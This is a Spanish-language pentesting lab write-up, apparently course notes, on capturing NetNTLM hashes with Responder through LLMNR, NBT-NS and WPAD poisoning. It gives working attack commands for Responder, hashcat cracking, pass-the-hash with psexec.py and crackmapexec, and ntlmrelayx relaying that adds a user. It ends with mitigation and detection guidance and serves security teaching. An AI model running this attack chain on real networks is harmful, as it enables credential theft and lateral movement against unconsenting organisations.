---
title: "🔍 Práctica: Captura de Credenciales NetNTLM con Responder"
aliases:
  - Captura de Credenciales NetNTLM con Responder
  - PoC responder
tags:
  - ifct0109/pocs
  - auditoria
  - responder
  - llmnr
  - nbt-ns
  - active-directory
---

# 🔍 Práctica: Captura de Credenciales NetNTLM con Responder

> [!abstract] Resumen del Laboratorio
> Arsenal técnico de auditoría y pentesting del Certificado IFCT0109: reconocimiento de infraestructura, captura y análisis de hashes, explotación, pivoting perimetral e investigación de desbordamientos de memoria en entornos controlados.

---

# 🎭 Práctica de Responder

## Envenenamiento de Red y Captura de Credenciales

> 📋 ENUNCIADO (DESCRIPCIÓN)

**Responder** es una utilidad ampliamente utilizada por los pentesters y hackers éticos para realizar ataques de envenenamiento de red (network poisoning), principalmente en redes Windows. Desarrollada originalmente por Laurent Gaffié, Responder se usa para interceptar y manipular tráfico de red con el objetivo de capturar credenciales, hashes de contraseñas y otros datos sensibles.

#### ⚠️ Uso Ético

Esta herramienta es para **auditorías de seguridad autorizadas**. El uso no autorizado es ilegal y puede tener consecuencias legales graves.

## 🔧 Funcionalidades Principales de Responder

### 1️⃣ Envenenamiento de Protocolos

#### 📡 NetBIOS (Network Basic Input/Output System)

Responder puede responder a consultas de NetBIOS en redes Windows, haciéndose pasar por otro dispositivo y capturando credenciales que se envían en respuesta.

#### 🌐 LLMNR (Link-Local Multicast Name Resolution)

Este protocolo es utilizado por Windows para resolver nombres de red en ausencia de un DNS. Responder puede interceptar estas solicitudes y responder con su propia dirección IP, capturando así credenciales de autenticación.

#### 📶 mDNS (Multicast DNS)

Similar a LLMNR, se utiliza en redes sin un servidor DNS central. Responder puede hacerse pasar por otros dispositivos en la red y capturar tráfico.

### 2️⃣ Captura de Hashes NTLM

Una vez que Responder engaña a un dispositivo para que envíe credenciales, puede capturar **hashes NTLM** (un protocolo de autenticación de Windows). Estos hashes pueden ser luego utilizados en:

| Tipo de Ataque | Descripción |
| --- | --- |
| 🔓 Fuerza Bruta | Crackear el hash para obtener la contraseña en texto claro |
| 🔄 Pass-the-Hash | Usar el hash directamente sin necesidad de crackearlo |
| 📡 NTLM Relay | Retransmitir el hash a otros servicios de la red |

### 3️⃣ Ataques de Retransmisión (NTLM Relay)

Responder puede utilizar los hashes capturados en ataques de retransmisión para autenticarse en otros servicios en nombre de la víctima.

### 4️⃣ Captura de Credenciales Multi-Protocolo

Responder puede capturar credenciales cuando un usuario intenta autenticarse en múltiples servicios:

        **🌐 HTTP/HTTPS**

        **📁 SMB/CIFS**

        **📋 LDAP**

        **📡 FTP**

        **🖥️ RDP**

        **📮 SMTP**

## ⚙️ Cómo Funciona Responder

### 📡 1. Escaneo de la Red

Responder escucha en la red local en busca de solicitudes LLMNR, NetBIOS y mDNS.

### 🎭 2. Respuestas Falsas

Cuando detecta una solicitud, responde con su propia dirección IP, haciéndose pasar por el dispositivo solicitado.

### 🔓 3. Captura de Datos

La víctima, creyendo que está comunicándose con el dispositivo legítimo, envía sus credenciales de autenticación, que son capturadas por Responder.

### 💾 4. Almacenamiento de Hashes

Las credenciales capturadas (normalmente en forma de hashes) son almacenadas para su posterior análisis o para ser usadas en ataques adicionales.

## 🛡️ Medidas de Mitigación

Para protegerse contra los ataques facilitados por Responder, se pueden tomar varias medidas:

| Medida | Descripción | Efectividad |
| --- | --- | --- |
| 🚫 Deshabilitar LLMNR y NetBIOS | Desactivar LLMNR y NetBIOS en todos los dispositivos de la red | ⭐⭐⭐⭐⭐ |
| 🔐 Implementar restricciones NTLM | Limitar o deshabilitar NTLM, favoreciendo Kerberos | ⭐⭐⭐⭐⭐ |
| 👁️ Monitoreo de Red | Implementar IDS para detectar actividades sospechosas | ⭐⭐⭐⭐ |
| 🔑 Seguridad de Contraseñas | Contraseñas robustas y políticas de rotación | ⭐⭐⭐⭐ |
| 🧱 Segmentación de Red | Separar la red en segmentos para limitar alcance | ⭐⭐⭐⭐ |

## 💻 Laboratorio y Comandos

> [!warning] 🖥️ Entorno:  Kali Linux con red en modo puente (Bridge)

### 📦 Instalación

```bash
sudo apt update
sudo apt install responder
```

### ❓ Ver la Ayuda

```bash
responder -h
```

### 🔍 Modo Análisis (Pasivo)

Recoge información de la red pero **NO envenena** servicios:

```bash
sudo responder -I eth0 -A
```

### 🎯 Modo Ataque SMB

Iniciar en escucha contra SMB:

```bash
sudo responder -I eth0
```

### 🌐 Modo WPAD

En escucha para ataques WPAD: Responder está esperando que alguien en la red busque un proxy automáticamente para engañarlo y robarle las credenciales.

```bash
sudo responder -I eth0 -wd
```

### 👻 Modo Incógnito

La víctima recibirá una IP falsa del atacante:

```bash
sudo responder -I eth0 -e 192.168.2.44
```

### 🔓 Crackear los Hashes

Usar HashCat con diccionario rockyou:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

#### 📊 Parámetros de Responder más usados

| Parámetro | Descripción |
| --- | --- |
| `-I` | Interfaz de red a usar (eth0, wlan0, etc.) |
| `-A` | Modo análisis (pasivo, solo observa) |
| `-w` | Habilitar servidor WPAD |
| `-d` | Habilitar DHCP poisoning |
| `-F` | Forzar autenticación básica WPAD |
| `-b` | Modo autenticación básica HTTP |
| `-e` | IP falsa para modo incógnito |
| `--lm` | Forzar downgrade a LM hashes. Sólo funcional con sistemas windows antiguos |

## 🎯 Prueba de Concepto (PoC)

### 🔴 Ataque 1: Envenenamiento LLMNR/NBT a través de SMB

#### 🎯 Objetivo del Ataque

Interceptar solicitudes de resolución de nombres en una red local. Cuando un dispositivo intenta conectarse a un recurso compartido SMB inexistente, el equipo lanza un multicast a la red. Responder responde haciéndose pasar por ese recurso y captura las credenciales NTLM.

#### 📍 Escenario Normal (sin ataque)

El usuario intenta acceder a un recurso SMB que no existe:

Windows muestra que el recurso no se encuentra:

#### 🎭 Escenario con Responder Activo

Iniciamos Responder en Kali Linux:

```bash
sudo responder -I eth0
```

Cuando la víctima intenta acceder al recurso SMB inexistente, Windows solicita credenciales:

> [!warning] ⚡ Resultado:  Independientemente de si el usuario rellena o cancela, Responder captura el hash NTLM automáticamente.

Hash capturado en Responder:

#### 💾 Almacenamiento de Credenciales

Todas las credenciales se guardan automáticamente en:

```bash
/usr/share/responder/logs/
```

#### 🔓 Crackeo del Hash

Guardamos el hash en un archivo y usamos HashCat:

```bash
hashcat -m 5600 hash_Manuel.txt /usr/share/wordlists/rockyou.txt
```

#### 🔄 Otros Protocolos Vulnerables

#### 🖥️ RDP (Remote Desktop Protocol)

Intento de conexión RDP:

Credenciales capturadas en Responder:

#### 📡 FTP (File Transfer Protocol)

Intento de conexión FTP:

Solicitud de credenciales:

        **✨ Ventaja de FTP:** Las credenciales se capturan en **texto claro** (sin hash)

### 🔵 Ataque 2: Envenenamiento LLMNR/NBT a través de WPAD

#### 🌐 ¿Qué es WPAD?

**WPAD (Web Proxy Auto-Discovery Protocol)** es un protocolo que permite a los dispositivos detectar automáticamente la configuración del proxy web. Este protocolo facilita la configuración de los navegadores para utilizar un servidor proxy, ayudando a gestionar el tráfico de internet dentro de una organización.

**Métodos:** WPAD utiliza DHCP y DNS para distribuir la información del proxy a los dispositivos clientes.

#### 🎯 El Ataque

Un atacante utiliza Responder para interceptar solicitudes WPAD y responder con su propia dirección IP, haciéndose pasar por el servidor proxy. Cuando los dispositivos intentan autoconfigurarse, envían credenciales de autenticación (hashes NTLM) que el atacante captura.

#### 🚀 Iniciando el Ataque WPAD

```bash
sudo responder -I eth0 -wd
```

Cuando la víctima accede a cualquier página web, se solicitan credenciales:

Credenciales capturadas en Responder:

#### 🔓 Modo Credenciales en Claro

Podemos forzar autenticación básica para obtener credenciales en texto claro:

```bash
sudo responder -I eth0 -wdF -b
```

Las credenciales recibidas **NO son hashes**, sino texto claro:

#### ⚠️ Downgrade Attack (SMB v1)

Podemos forzar el uso de versiones antiguas de SMB para obtener hashes LM (más fáciles de crackear):

```bash
sudo responder -I eth0 -wdF --lm --disable-ess
```

> [!warning] 🛡️ Protección:  Las versiones modernas de Windows deberían advertir que se está usando SMB antiguo.

## 📊 Resumen Comparativo de Ataques

| Ataque | Vector | Credenciales | Dificultad |
| --- | --- | --- | --- |
| SMB Poisoning | Recurso compartido inexistente | Hash NTLM | ⭐⭐ |
| WPAD Poisoning | Autoconfiguración proxy | Hash NTLM / Texto claro | ⭐⭐⭐ |
| RDP Poisoning | Conexión escritorio remoto | Hash NTLM | ⭐⭐ |
| FTP Poisoning | Conexión FTP | Texto claro ✅ | ⭐ |
| SMB Downgrade | Forzar SMBv1 | Hash LM (fácil crackear) | ⭐⭐⭐ |

## 🔐 Tipos de Hashes: NTLM vs NTLMv2 Response

> [!warning] ⚠️ Confusión Común
>        Muchos confunden el  NTLM Hash  (almacenado) con el  NTLMv2 Response  (capturado en tráfico). Son  completamente diferentes  y tienen usos distintos en ataques.

### 📊 Comparación Técnica

| Característica | NTLM Hash | NTLMv2 Response |
| --- | --- | --- |
| ¿Qué es? | Hash de la contraseña almacenado en el sistema | Respuesta de autenticación en tráfico de red |
| Fórmula | `MD4(UTF-16-LE(password))` | `HMAC-MD5(NTLM_Hash, Challenge + Blob)` |
| Dónde se encuentra | SAM, NTDS.dit, LSASS (memoria) | Tráfico de red durante autenticación |
| Formato | `8846f7eaee8fb117ad06bdd830b7586c` | `user::domain:challenge:response:blob` |
| Longitud | 32 caracteres hexadecimales (16 bytes) | Variable (incluye múltiples componentes) |
| Es estático | ✅ Sí (no cambia) | ❌ No (cambia en cada autenticación) |
| Pass-the-Hash | ✅ SÍ funciona | ❌ NO funciona |
| NTLM Relay | ✅ Sí | ✅ Sí (en tiempo real) |
| Se puede crackear | ✅ Sí | ✅ Sí |

### 🔬 NTLM Hash - El Hash "Real"

#### 📍 ¿Dónde se almacena?

* Local Windows: `C:\Windows\System32\config\SAM`

* Active Directory: `NTDS.dit`

* Memoria (LSASS): Proceso `lsass.exe`

#### 💻 Ejemplo de NTLM Hash:

```bash
Usuario: Administrator
Contraseña: Password123
NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
```

#### 🔓 Características:

* ✅ Estático: Siempre el mismo para la misma contraseña

* ✅ Reutilizable: Se puede usar directamente sin conocer la contraseña

* ✅ Pass-the-Hash: Compatible con este ataque

* ⚠️ Sin salt: Vulnerable a rainbow tables

### 📡 NTLMv2 Response - Lo que Captura Responder

#### 🎭 ¿Qué es?

Es una **respuesta criptográfica** que el cliente envía al servidor durante la autenticación NTLM. No es el hash de la contraseña, sino una **prueba matemática** de que el cliente conoce la contraseña.

#### 📊 Formato capturado por Responder:

```bash
manuel::WORKGROUP:1122334455667788:A1B2C3D4E5F60708090A0B0C0D0E0F10:01010...
  ↑         ↑           ↑                      ↑                        ↑
Usuario   Dominio   Server Challenge     NTLMv2 Response              Blob
```

#### 🔬 Componentes:

| Componente | Descripción |
| --- | --- |
| Usuario | Nombre de usuario que intenta autenticarse |
| Dominio | Dominio o grupo de trabajo |
| Server Challenge | Número aleatorio de 8 bytes enviado por el servidor |
| NTLMv2 Response | Respuesta calculada: `HMAC-MD5(NTLM_Hash, datos)` |
| Blob | Datos adicionales (timestamp, target info, client challenge) |

#### ⚡ Características:

* ❌ Dinámico: Cambia en cada autenticación (challenge diferente)

* ❌ No reutilizable: Solo válido para ese challenge específico

* ❌ No sirve para Pass-the-Hash: El servidor esperará otro challenge

* ✅ Se puede crackear: Para obtener la contraseña original

* ✅ NTLM Relay: Se puede retransmitir en tiempo real

### 🔄 Proceso de Autenticación NTLMv2

        **1️⃣ Cliente solicita acceso**

```bash
Cliente: "Quiero acceder a \\servidor\recurso"
```

        **2️⃣ Servidor envía Challenge (número aleatorio)**

```bash
Servidor: "Demuestra que conoces la contraseña. Challenge: 1122334455667788"
```

        **3️⃣ Cliente calcula Response**

```bash
Cliente usa:
- Su NTLM Hash (almacenado localmente)
- El Challenge recibido
- Timestamp actual
- Información del servidor

Response = HMAC-MD5(NTLM_Hash, Challenge + Blob)
```

        **4️⃣ Cliente envía Response**

```bash
Cliente → Servidor: "Aquí está mi respuesta: A1B2C3D4E5F60708..."
↑
Esto es lo que CAPTURA Responder
```

        **5️⃣ Servidor valida**

```bash
Servidor:
- Calcula la misma respuesta usando el NTLM Hash que tiene almacenado
- Compara con la respuesta recibida
- Si coinciden → Acceso concedido ✅
```

### ⚔️ Usos Maliciosos de Cada Tipo

#### 🔴 Ataque 1: Pass-the-Hash (solo NTLM Hash)

#### 🎯 Requisito: NTLM Hash

Este ataque **solo funciona con el NTLM Hash real**, NO con NTLMv2 Response.

#### 📋 ¿Cómo obtener el NTLM Hash?

* Mimikatz: Extracción desde memoria (LSASS)

* Secretsdump: Volcado de SAM o NTDS.dit

* Hashdump: Desde Meterpreter con acceso admin

* Crackeo: Crackear NTLMv2 Response para obtener contraseña → calcular hash

#### 💻 Ejemplo de Pass-the-Hash:

```bash
# Usando pth-toolkit
pth-winexe -U 'DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //192.168.1.50 cmd

# Usando Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c DOMAIN/Administrator@192.168.1.50

# Usando CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

#### ✅ Ventajas para el atacante:

* No necesita la contraseña en texto claro

* Funciona incluso con contraseñas muy largas y complejas

* Bypass de autenticación multifactor en algunos casos

* Permite movimiento lateral en la red

#### 🔵 Ataque 2: Crackeo de NTLMv2 Response

#### 🎯 Objetivo: Obtener contraseña en texto claro

Cuando Responder captura un NTLMv2 Response, podemos intentar crackearlo para descubrir la contraseña original.

#### 📋 Proceso de Crackeo:

```bash
# 1. Capturar con Responder
sudo responder -I eth0

# 2. Hash capturado se guarda en:
/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt

# Contenido:
manuel::WORKGROUP:1122334455667788:A1B2C3D4E5F60708...

# 3. Crackear con Hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# 4. Con reglas para mayor efectividad
hashcat -m 5600 hash.txt rockyou.txt -r best64.rule

# 5. Si tiene éxito:
manuel::WORKGROUP:1122334455667788:A1B2...:<strong>Password123</strong>
```

#### 🔧 Una vez obtenida la contraseña:

**Opción A:** Usarla directamente

```bash
smbclient //192.168.1.50/C$ -U manuel%Password123
```

**Opción B:** Calcular NTLM Hash para Pass-the-Hash

```python
python3 -c "import hashlib; print(hashlib.new('md4', 'Password123'.encode('utf-16le')).hexdigest())"
Resultado: 8846f7eaee8fb117ad06bdd830b7586c
```

#### 🟢 Ataque 3: NTLM Relay (con NTLMv2 Response)

#### 🎯 Sin necesidad de crackear

En lugar de intentar crackear el NTLMv2 Response, lo **retransmitimos en tiempo real** a otro servicio.

#### 🔄 Cómo funciona:

        **1. Víctima intenta autenticarse contra Responder**

```bash
Víctima: "Dame acceso a \\atacante\recurso"
```

        **2. Responder captura la autenticación**

```bash
Responder: "Tengo un NTLMv2 Response válido"
```

        **3. Responder lo retransmite INMEDIATAMENTE a otro servidor**

```bash
Responder → Servidor2: "Aquí está la autenticación válida"
```

        **4. Servidor2 acepta porque es válida en ese momento**

```bash
Servidor2: "Autenticación válida, acceso concedido ✅"
```

#### 💻 Ejemplo con ntlmrelayx:

```bash
# Configurar relay hacia un servidor objetivo
ntlmrelayx.py -t 192.168.1.50 -smb2support -c "whoami"

# Con múltiples objetivos
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Pass123 /add"

# Para obtener shell
ntlmrelayx.py -t 192.168.1.50 -smb2support -i
# Luego conectar: nc 127.0.0.1 11000
```

#### ⚡ Ventajas del NTLM Relay:

* ✅ No necesita crackear ningún hash

* ✅ Funciona con contraseñas muy complejas

* ✅ Bypass de detección de fuerza bruta

* ✅ Funciona en tiempo real (segundos)

* ✅ No requiere acceso administrativo previo

### 📊 Tabla Resumen de Ataques

| Ataque | Requisito | Qué obtienes | Dificultad | Velocidad |
| --- | --- | --- | --- | --- |
| Pass-the-Hash | NTLM Hash (almacenado) | Acceso directo sin contraseña | ⭐⭐⭐ (requiere hash previo) | ⚡ Instantáneo |
| Crackeo NTLMv2 | NTLMv2 Response (capturado) | Contraseña en texto claro | ⭐⭐⭐⭐ (depende de contraseña) | 🐌 Horas/Días |
| NTLM Relay | NTLMv2 Response (en tiempo real) | Autenticación en otro servidor | ⭐⭐ (requiere configuración) | ⚡⚡ Segundos |

### 💡 Flujo Completo: De Responder a Compromiso Total

#### 🎯 Escenario Realista:

        **Paso 1: Captura con Responder**

```bash
sudo responder -I eth0 -wFb

# Capturado:
manuel::WORKGROUP:1122334455667788:A1B2C3D4E5F60708...
```

        **Paso 2: Crackeo (Opción A)**

```bash
hashcat -m 5600 hash.txt rockyou.txt

# Resultado:
manuel:Password123
```

        **Paso 3: Calcular NTLM Hash**

```python
python3 -c "import hashlib; print(hashlib.new('md4', 'Password123'.encode('utf-16le')).hexdigest())"

# Resultado:
8846f7eaee8fb117ad06bdd830b7586c
```

        **Paso 4: Pass-the-Hash**

```bash
crackmapexec smb 192.168.1.0/24 -u manuel -H 8846f7eaee8fb117ad06bdd830b7586c

# Descubrir:
192.168.1.10 - manuel:PASSWORD ✅
192.168.1.15 - manuel:PASSWORD ✅  (mismo usuario en otro PC)
192.168.1.20 - manuel:PASSWORD ✅
```

        **Paso 5: Movimiento Lateral**

```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c manuel@192.168.1.15

# ¡Shell administrativa obtenida! 🎯
```

> [!warning] 🔑 Puntos Clave para Recordar
>
>          ✅  NTLM Hash  = Hash almacenado → Pass-the-Hash directo
>          ✅  NTLMv2 Response  = Hash de tráfico → Crackear o Relay
>          ❌ NO puedes hacer Pass-the-Hash con NTLMv2 Response directamente
>          ✅ SÍ puedes crackear NTLMv2 para obtener contraseña → calcular NTLM Hash → PtH
>          ✅ NTLM Relay es más rápido que crackear (segundos vs horas)
>          ⚠️ Responder captura NTLMv2 Response, NO NTLM Hash

## 🔐 Defensa y Detección

### 🛡️ Cómo Protegerse

#### 1️⃣ Deshabilitar Protocolos Vulnerables

```bash
# PowerShell (como administrador)
# Deshabilitar LLMNR
New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

# Deshabilitar NetBIOS sobre TCP/IP
# Panel de Control → Adaptador de red → Propiedades → TCP/IPv4 → Avanzado → WINS
```

#### 2️⃣ Usar Kerberos en vez de NTLM

Configurar políticas de grupo para favorecer Kerberos y restringir NTLM.

#### 3️⃣ Monitoreo Activo

* Implementar IDS/IPS (Snort, Suricata)

* Monitorear logs de autenticación

* Detectar respuestas multicast anómalas

#### 4️⃣ Segmentación de Red

Usar VLANs para separar segmentos críticos de la red.

### 👁️ Detección de Ataques Responder

#### 🚨 Señales de Alerta

* Múltiples solicitudes de autenticación fallidas

* Respuestas LLMNR/NetBIOS desde IPs desconocidas

* Tráfico WPAD inusual

* Intentos de downgrade de SMB

* Uso de LM hashes (obsoleto)

## 📚 Recursos Adicionales

* 🔗 Repositorio oficial de Responder (GitHub)

* 📖 Documentación de LLMNR y NetBIOS en Microsoft Docs

* 🎥 Tutoriales de pentesting con Responder

* 📝 Guías de hardening de Windows contra poisoning

#### ⚠️ Recordatorio Ético

**Solo usar en entornos autorizados:**

* ✅ Laboratorios propios

* ✅ Auditorías de seguridad contratadas

* ✅ Entornos de prueba con permisos escritos

* ❌ Redes públicas o de terceros sin autorización

**El uso no autorizado es un delito.**

---

## 🔗 Enlaces y Referencias
* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
* 🧪 [[02 - MODULOS/04 - Hacking Ético|Módulo Central de Hacking Ético]]
